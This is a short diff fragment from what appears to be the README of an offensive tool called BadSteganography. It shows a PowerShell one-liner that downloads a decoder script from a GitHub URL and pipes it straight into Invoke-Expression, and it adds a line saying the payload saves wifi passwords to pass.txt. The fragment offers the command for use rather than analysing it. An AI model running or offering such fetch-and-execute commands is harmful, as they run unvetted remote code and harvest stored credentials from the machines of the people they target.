@@ -24,3 +24,4 @@ This default payload grabs the contents of the decoder, which then downloads the
 ```
 iex(iwr https://raw.githubusercontent.com/CharlesTheGreat77/BadSteganography/main/spread_spectrum_decode.txt).Content | iex
 ```
+-- Saves wifi passwords to pass.txt
